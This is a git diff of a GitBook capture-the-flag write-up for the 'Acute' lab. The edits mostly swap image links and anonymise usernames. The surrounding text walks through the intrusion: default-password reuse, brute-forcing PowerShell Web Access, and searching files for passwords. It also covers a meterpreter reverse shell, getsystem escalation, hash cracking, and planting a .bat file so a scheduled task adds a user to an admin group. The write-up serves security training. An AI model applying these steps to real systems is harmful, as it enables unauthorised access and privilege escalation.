@@ -58,13 +58,13 @@ I get back a webpage, this is positive.
 
 
 
-![](<../../.gitbook/assets/image (21).png>)
+![](<../../.gitbook/assets/image (21) (1).png>)
 
 I view the page source code, There's nothing of interest to be found here.
 
 Under /about.html there is a section on "who we work with" and within this text there are some names.
 
-![](<../../.gitbook/assets/image (31).png>)
+![](<../../.gitbook/assets/image (31) (1).png>)
 
 I make a list of the names as firstname.lastname in a user.txt file.
 
@@ -74,7 +74,7 @@ On the /about.html page, there is an induction checklist for new starters in a .
 
 Under the Overview section there is a note "Walk new starter through the password change policy, they wil need to change it from the default Password1!" - Here's my first password.
 
-![](<../../.gitbook/assets/image (32).png>)
+![](<../../.gitbook/assets/image (32) (1).png>)
 
 Under First 3 Months, there is a section that provides a link to a "Remote training" site.
 
@@ -109,7 +109,7 @@ I now edit my existing username.txt list and change the format of the usernames 
 
 The remote URL takes me to a Windows Powershell Web Access page. I test all the variable combinations that could possibly work with a manual brute force.
 
-![](<../../.gitbook/assets/image (22).png>)
+![](<../../.gitbook/assets/image (22) (1).png>)
 
 Using usernames.txt and Password1 against atsserver.acute.local and acute-pc01.acute.local
 
@@ -155,7 +155,7 @@ netgroup
 * **netgroup /local:** Shows Local Groups
 * **netgroup /domain:** Shows Groups within the Domain - This failed.
 
-![](<../../.gitbook/assets/image (9).png>)
+![](<../../.gitbook/assets/image (9) (1).png>)
 
 QWINSTA results advise that Edavies has a Console session running, This would be an interactive logon either via RDP or local logon. - Noted.
 
@@ -175,13 +175,13 @@ Get-ChildItem (gci) allows me to search for all Files on C:\ with a name that en
 * **Erroraction:** Use with SilentlyContinue to not display errors and to continue even when an error occurs.
 * **Select:** To avoid verbose output, use select with Name & Directory to filter the results.
 
-![](<../../.gitbook/assets/image (27).png>)
+![](<../../.gitbook/assets/image (16).png>)
 
 Get-Content allows me to read files with data in them such as .txt, .ini, .log., .ps1 **findstr /i Password:** Find String with a value of "Password" within the text file. /i means case-insensitive.
 
 \*\* This method is more targetted and provides less irrelevant results, you can use .txt, .ini, .log extensions \*\*
 
-For more eneralized results that return more data that may not be so accurate.
+For more generalized results that return more data that may not be so accurate.
 
 ```
 findstr /si Password *.ini *.xml *.txt, *.ps1
@@ -197,9 +197,9 @@ Lastly, I will use the last gci cmdlet.
  Get-Childitem C:\*.txt -Recurse -Hidden -Depth 2 -Force -Erroraction SilentlyContinue | Select Directory, Name >> gci-c-hidden.txt
 ```
 
-This time I use the \* **Hidden** switch, This will return results of all files that are marked as hidden.
+This time I use the \* **Hidden** switch, This will return only results of all files that are marked as hidden.
 
-![](<../../.gitbook/assets/image (2).png>)
+![](<../../.gitbook/assets/image (2) (1).png>)
 
 After viewing the results, there is a .ini file in C:\Utils which I know is hidden.
 
@@ -228,7 +228,7 @@ python -m http.server 9090
 * **http.server:** This starts running a webserver on my Kali VM
 * **9090:** This is the port that is opened. **from Whatever directory I run the http.server, the contents will be published over port 9090**
 
-![](<../../.gitbook/assets/image (1).png>)
+![](<../../.gitbook/assets/image (1) (1).png>)
 
 ![](<../../.gitbook/assets/image (17).png>)
 
@@ -269,7 +269,7 @@ Enter-PSSession -Computername ATSSERVER -configurationname dc_manage -Credential
 
 This failes with a number of errors.
 
-![](<../../.gitbook/assets/image (28).png>)
+![](<../../.gitbook/assets/image (28) (1).png>)
 
 When I attempt to do the following, I get the error "You are currently in a windows powershell pssession and cannot use the enter-pssession cmdlet"
 
@@ -324,6 +324,8 @@ Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -credential 
 
 * **net group /domain:** Provides memberships of the Managers Group. user2 and user3 are the only users of the managers group.
 
+![](<../../.gitbook/assets/image (18).png>)
+
 Enumerate groups on ATSSERVER
 
 ```
@@ -331,6 +333,8 @@ invoke-command -computername ATSSERVER -configurationname dc_manage -credential 
 ```
 
 * **net group:** Will provide Domain Groups if run from a DC.
+
+![](<../../.gitbook/assets/image (21).png>)
 
 I use my gci to search for any files of interest under the current user
 
@@ -376,23 +380,25 @@ Now this script will call the reverse shell, I run my meterpreter listener again
 
 ![](<../../.gitbook/assets/image (10).png>)
 
-* Success. My meterpreter listerner is now connected to ATSSERVER. using whoami /groups. I can see that user4 is part of the 'Builtin\Administrators' group. Using meterpretyer 'getsystem' I can escalate my privileges.
+* Success. My meterpreter listerner is now connected to ATSSERVER. using whoami /groups. I can see that user4 is part of the 'Builtin\Administrators' group.
 
-![](<../../.gitbook/assets/image (18).png>)
+![](<../../.gitbook/assets/image (18) (1).png>)
+
+&#x20;Using meterpretyer 'getsystem' I can escalate my privileges.
 
 ![](<../../.gitbook/assets/image (14).png>)
 
-![](<../../.gitbook/assets/image (20).png>)
-
 I am now NT AUTHORITY\SYSTEM with a shell.
+
+![](<../../.gitbook/assets/image (20).png>)
 
 I dump the hashes of the box and crack them with Rockyou.txt. The password is super simple and I add it to my passwords.txt list.
 
-![](<../../.gitbook/assets/image (3).png>)
+![](<../../.gitbook/assets/image (3) (1).png>)
 
 I test my credentials with the administrator account through the use of invoke-command but fails.
 
-I refer back to my username.txt and check for any password re-use amongst the accouts. Upon my first attempt, I am successful with user awallace.
+I refer back to my username.txt and check for any password re-use amongst the accouts. Upon my first attempt, I am successful with user3.
 
 ```
 
@@ -404,42 +410,49 @@ $creds = New-Object System.Management.Automation.PSCredential ($username, $secur
 Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -credential $creds -command {whoami}
 ```
 
-I now go back to checking C:\Program Fies\keepmeon as user3, and I have access. Within keepmeon, there is a.bat file, I use 'cat' again to check the contents. There is a line \`\`\`text REM This is run every 5 minutes. For Lois use ONLY
+I now go back to checking C:\Program Fies\keepmeon as user3, and I have access. Within keepmeon, there is a.bat file, I use 'cat' again to check the contents.&#x20;
 
-````
+There is a line \`\`\`text REM This is run every 5 minutes. For Lois use ONLY
+
+![](<../../.gitbook/assets/image (28).png>)
 
 I know from the .docx that Lois is the only person with Site Admin access, so she must be the privileged user within the environment. I can also assume that this .bat is running under a Scheduled task as it references 'every 5 minutes'
 
+From what I understand, the .bat file is checking for any \* .bat files within 'keepmeon' and executing them.
 
-From what I understand, the .bat file is checking for any * .bat files within 'keepmeon' and
-executing them.
+I know from our Domain Group enumeration that the Site Admins group is named 'Site\_Admin'
 
-I know from our Domain Group enumeration that the Site Admins group is named 'Site_Admin'
+I can create a .bat file that will add user3 to the site\_admins group. Knowing that I cannot create and download the file, I will need to create it through Powershell.
 
-I can create a .bat file that will add awallace to the site_admins group. Knowing that I cannot create and download the file, I will need to create it through Powershell.
+![](<../../.gitbook/assets/image (31).png>)
 
-```text
-
+```
 Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $creds -ScriptBlock {Set-Content -Path 'c:\program files\Keepmeon\admin.bat' -Value 'net group site_admin user3 /add /domain'}
-````
+```
 
 I double check the content with 'cat'
+
+![](<../../.gitbook/assets/image (24).png>)
 
 ```
 Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $creds -ScriptBlock {cat 'c:\program files\Keepmeon\admin.bat'}
 ```
 
-Wait for the scheduled task to run and then check awallaces group memberships.
+Wait for the scheduled task to run and then check user3 group memberships.
 
 ```
 Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $creds -ScriptBlock {net user user3}
 ```
 
-Confirmed, awallace is now part of the site\_admins group. Time to enumerate.
+Confirmed, user3 is now part of the site\_admins group. Time to enumerate.
+
+![](<../../.gitbook/assets/image (2).png>)
 
 ```
 Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $creds -ScriptBlock {get-childitem -path C:\users\*.txt -Recurse -Depth 2 -ErrorAction SilentlyContinue}
 ```
+
+![](<../../.gitbook/assets/image (32).png>)
 
 Result is root.xt at C:\users\administrator\desktop\ and user.txt in imonks\desktop.
 
